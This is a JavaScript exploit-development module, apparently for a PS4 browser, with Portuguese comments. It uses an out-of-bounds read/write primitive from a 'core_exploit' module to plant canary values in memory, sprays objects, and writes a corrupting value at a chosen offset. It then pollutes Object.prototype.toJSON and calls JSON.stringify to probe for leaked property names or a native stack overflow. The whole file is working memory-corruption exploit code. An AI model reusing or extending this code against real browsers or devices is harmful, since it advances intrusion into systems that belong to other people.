// js/script3/testCorruptedIteratorLeakFocusConsole.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObjectForLeak { // Renomeada para clareza do teste
    constructor(id) {
        this.id_leak = `MyObjLeak-${id}`;
        this.marker_leak = 0xFEFEDEAD;
        this.data1 = "some_data1";
        this.data2 = { nested_leak: "data2_nested" };
        for(let i=0; i<3; i++) this[`filler_leak_${i}`] = `f_val_leak_${i}`;
    }
}

const CANARY_QWORDS_FOR_LEAK = [
    { offset: 0x100, value: new AdvancedInt64("0xAAAAAAAAAAAAAAAA"), desc: "CanaryA_QL" },
    { offset: 0x108, value: new AdvancedInt64("0xBBBBBBBBBBBBBBBB"), desc: "CanaryB_QL" },
];
const CANARY_STRINGS_FOR_LEAK = [
    { offset: 0x200, value: "LEAK_TARGET_STRING_PROP_NAME_01", desc: "CanaryStrLeak1" },
    { offset: 0x230, value: "ANOTHER_PHANTOM_PROP_NAME_XYZ", desc: "CanaryStrLeak2" },
];

function stringToUint8ArrayForLeak(str) {
    const buf = new Uint8Array(str.length);
    for (let i = 0; i < str.length; i++) buf[i] = str.charCodeAt(i);
    return buf;
}

export function toJSON_FocusOnPropNameLeak() {
    const FNAME_toJSON = "toJSON_FocusOnPropNameLeak";
    let iteration_count = 0;
    const MAX_ITER_SAFETY_BREAK = 150; // Reduzido para capturar logs mais cedo
    let leaked_prop_names = []; // Para armazenar props que parecem canários

    // Para o console do PS4, tente manter os logs aqui o mais simples possível.
    console.log(`[${FNAME_toJSON}] Entrando. this.id_leak (tentativa): ${String(this?.id_leak).substring(0,20)}`);
    // logS3 não será usado aqui dentro para minimizar o risco de interferência com o RangeError

    try {
        for (const prop in this) { // O this aqui será o MyComplexObjectForLeak
            iteration_count++;
            const prop_as_string = String(prop);

            // Log IMEDIATO de 'prop' para o console do PS4
            console.log(`[${FNAME_toJSON}] Iter: ${iteration_count}, Raw Prop:`, prop); // Loga o 'prop' cru

            // Verificar se 'prop_as_string' corresponde a um dos nossos canários string
            for (const canaryStr of CANARY_STRINGS_FOR_LEAK) {
                if (prop_as_string.includes(canaryStr.value)) {
                    const leak_msg = `!!!! LEAK DE NOME DE PROPRIEDADE !!!! Prop: '${prop_as_string}' corresponde ao Canary: ${canaryStr.desc}`;
                    console.warn(leak_msg); // Usar console.warn para destacar
                    leaked_prop_names.push(leak_msg);
                }
            }
            // Não tentar acessar this[prop] aqui para isolar se o RangeError é da enumeração ou do acesso
            if (iteration_count >= MAX_ITER_SAFETY_BREAK) {
                console.warn(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${prop_as_string.substring(0,100)}'.`);
                break;
            }
        }
        console.log(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count} iterações.`);
    } catch (e_loop) {
        console.error(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN: ${e_loop.name} - ${e_loop.message}`, e_loop);
        // Retornar um payload simples com o erro
        return `{"variant":"${FNAME_toJSON}","error_in_loop":"${e_loop.name}: ${e_loop.message}","iterations":${iteration_count}}`;
    }
    // Retornar um payload MUITO simples para evitar recursão na serialização do payload
    return `{"variant":"${FNAME_toJSON}","iterations":${iteration_count},"leaks_found_count":${leaked_prop_names.length}}`;
}

export async function executeCorruptedIteratorLeakFocusConsoleTest() {
    const FNAME_TEST = "executeCorruptedIteratorLeakFocusConsoleTest";
    logS3(`--- Iniciando Teste: Vazamento por Iterador Corrompido (Foco Console PS4) ---`, "test", FNAME_TEST);
    document.title = `CorruptIterLeak FocusConsole`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) { logS3("Falha OOB Setup.", "error", FNAME_TEST); return; }

    logS3(`1. Preenchendo oob_array_buffer_real com padrões canary...`, "info", FNAME_TEST);
    for (const canary of CANARY_QWORDS_FOR_LEAK) {
        try {
            if (canary.offset + 8 <= oob_array_buffer_real.byteLength) oob_write_absolute(canary.offset, canary.value, 8);
        } catch (e) { /* ignora */ }
    }
    for (const canary of CANARY_STRINGS_FOR_LEAK) {
        try {
            const strBytes = stringToUint8ArrayForLeak(canary.value);
            if (canary.offset + strBytes.length <= oob_array_buffer_real.byteLength) {
                for(let k=0; k < strBytes.length; k++) oob_write_absolute(canary.offset + k, strBytes[k], 1);
            }
        } catch (e) { /* ignora */ }
    }
    logS3("   Preenchimento com canários concluído.", "info", FNAME_TEST);

    const spray_count = 3; // Apenas alguns objetos
    const sprayed_objects = [];
    logS3(`2. Pulverizando ${spray_count} instâncias de MyComplexObjectForLeak...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) sprayed_objects.push(new MyComplexObjectForLeak(i));

    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    logS3(`3. Escrevendo trigger 0xFFFFFFFF em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "warn", FNAME_TEST);
    oob_write_absolute(corruption_offset_trigger, 0xFFFFFFFF, 4);

    await PAUSE_S3(100); // Pausa curta para permitir que o PS4 processe o log antes do potencial crash

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    const obj_to_probe = sprayed_objects[0];

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_FocusOnPropNameLeak,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`4. Object.prototype.toJSON poluído com ${toJSON_FocusOnPropNameLeak.name}.`, "info", FNAME_TEST);

        logS3(`5. Sondando objeto ${obj_to_probe.id_leak}... ESPERANDO RangeError ou LEAK DE NOME DE PROP. VERIFIQUE O CONSOLE DO PS4.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id_leak} (CorruptIterConsole)`;
        try {
            console.log(`--- [${FNAME_TEST}] PRESTES A CHAMAR JSON.stringify(obj_to_probe) ---`);
            const stringifyResult = JSON.stringify(obj_to_probe); // Chama a toJSON poluída
            console.log(`--- [${FNAME_TEST}] JSON.stringify(obj_to_probe) RETORNOU (INESPERADO SE HOUVE RANGEERROR) ---`);
            logS3(`     JSON.stringify(${obj_to_probe.id_leak}) completou. Resultado da toJSON (string): ${stringifyResult}`, "info", FNAME_TEST);
        } catch (e_str) {
            console.error(`--- [${FNAME_TEST}] ERRO NO CATCH EXTERNO de JSON.stringify: ${e_str.name} ---`, e_str);
            logS3(`     !!!! ERRO AO STRINGIFY ${obj_to_probe.id_leak} (EXTERNO À toJSON): ${e_str.name} - ${e_str.message} !!!!`, "critical", FNAME_TEST);
            if (e_str.stack) logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError (Estouro de Pilha Nativo EXTERNO) OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED (Native Console)!`;
            }
        }
    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }
    clearOOBEnvironment();
    logS3(`--- Teste de Vazamento por Iterador Corrompido (Foco Console PS4) CONCLUÍDO ---`, "test", FNAME_TEST);
}
